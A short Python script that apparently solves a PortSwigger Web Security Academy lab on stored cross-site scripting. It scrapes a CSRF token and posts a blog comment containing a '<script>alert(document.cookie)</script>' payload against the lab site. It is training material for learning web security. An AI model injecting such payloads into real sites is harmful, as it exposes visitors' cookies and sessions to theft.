"""
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''<script>alert(document.cookie)</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_string,
    'name' : 'baa',
    'email' : 'baa@pdx.edu',
    'website': 'https://pdx.edu'
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)